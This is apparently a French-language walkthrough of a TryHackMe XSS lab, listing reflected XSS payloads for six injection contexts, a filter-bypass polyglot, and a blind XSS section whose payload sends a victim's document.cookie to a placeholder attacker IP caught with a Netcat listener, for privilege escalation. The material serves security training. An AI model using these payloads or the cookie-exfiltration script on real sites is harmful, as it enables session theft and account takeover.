# 🛡️ TryHackMe – XSS Walkthrough (Payload THM)

Ce document récapitule les différents niveaux de la machine TryHackMe sur l'exécution de **payloads XSS** afin d’afficher un `alert('THM')`. On y explore les cas typiques de failles XSS **reflected** avec filtrage, injection dans attributs ou dans du JavaScript inline.

---

## 🎯 Objectif général

- Déclencher une alerte `alert('THM')` à chaque niveau.
- Comprendre les types de contextes d'injection : HTML, attribut, JavaScript, filtré, etc.
- Appliquer un payload adapté à chaque situation.

---

## 🧪 Niveaux & Payloads

### 🔹 Niveau 1 – Injection simple dans le HTML

**Contexte :** Le nom est injecté directement dans le corps HTML.

**Payload :**
```html
<script>alert('THM');</script>
```

---

### 🔹 Niveau 2 – Injection dans un attribut `value=""`

**Contexte :** Le nom est injecté dans l’attribut `value` d’un champ `<input>`.

**Payload :**
```html
"><script>alert('THM');</script>
```

**Explication :** Le `">` ferme l’attribut `value="`, puis le `script` est injecté.

---

### 🔹 Niveau 3 – Injection dans une balise `<textarea>`

**Contexte :** Le texte est injecté dans une balise `<textarea>`.

**Payload :**
```html
</textarea><script>alert('THM');</script>
```

**Explication :** On ferme le `<textarea>`, puis on injecte le `<script>`.

---

### 🔹 Niveau 4 – Injection dans du JavaScript inline

**Contexte :** Le nom est intégré dans une variable JS inline.

**Payload :**
```js
';alert('THM');// 
```

**Explication :**
- `'` ferme la chaîne.
- `;` termine l’instruction JS.
- `//` commente le reste.

---

### 🔹 Niveau 5 – Filtrage de mot-clé `script`

**Contexte :** Le mot `script` est supprimé automatiquement.

**Payload contournement :**
```html
<sscriptcript>alert('THM');</sscriptcript>
```

**Explication :** Le filtre supprimant `script`, le doublement contourne la détection.

---

### 🔹 Niveau 6 – Injection avec filtre `<` et `>` bloqués

**Contexte :** On ne peut pas injecter de balises `<script>` directement.

**Payload avec `onload`:**
```html
/images/cat.jpg" onload="alert('THM');
```

**Explication :** Utilisation d’un événement `onload` dans un tag `<img>`.

---

## 🧪 Payload Polyglot Universel

Un payload XSS "polyglot" peut fonctionner dans de multiples contextes, même avec des filtres :

```js
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
```

---

## 🏁 Résumé

| Niveau | Contexte                        | Payload                                     |
|--------|----------------------------------|---------------------------------------------|
| 1      | HTML direct                      | `<script>alert('THM');</script>`            |
| 2      | Input `value=""`                | `"><script>alert('THM');</script>`          |
| 3      | Balise `<textarea>`             | `</textarea><script>alert('THM');</script>` |
| 4      | JavaScript inline               | `';alert('THM');//`                          |
| 5      | Filtrage de `script`            | `<sscriptcript>alert('THM');</sscriptcript>`|
| 6      | Filtrage `<`, `>` contourné via `onload` | `/images/cat.jpg" onload="alert('THM');`     |

---

## 🔍 Bonus – Blind XSS & Cookie Stealing

Dans cette dernière tâche, on exploite une **faille de type Blind XSS** dans le système de création de ticket support.

### 🔧 Étapes pratiques :

1. Accède au site cible :  
   `https://10-10-186-81.p.thmlabs.com`

2. Crée un compte via **Customers > Signup**.

3. Va sur **Support Tickets**, clique sur **Create Ticket**, et entre :
   - Subject : `test`
   - Content : `</textarea><script>alert('THM');</script>`

4. Le `alert('THM')` prouve la faille XSS sur un champ censé être sécurisé.

---

### 🎯 Exploitation : Cookie Stealing via Blind XSS

1. Prépare un listener avec Netcat sur l’AttackBox :
```bash
nc -nlvp 9001
````

2. Payload XSS à injecter dans un ticket :

```html
</textarea><script>fetch('http://YOUR_IP:9001?cookie=' + btoa(document.cookie));</script>
```

🔸 Remplace `YOUR_IP` par l’IP de l’AttackBox (ou catcher).
🔸 Tu recevras une requête contenant les cookies en base64.

3. Décode sur :
   [https://www.base64decode.org/](https://www.base64decode.org/)

---

### ✅ But : Obtenir les cookies d’un **admin/staff** consultant le ticket → escalade de privilèges possible.

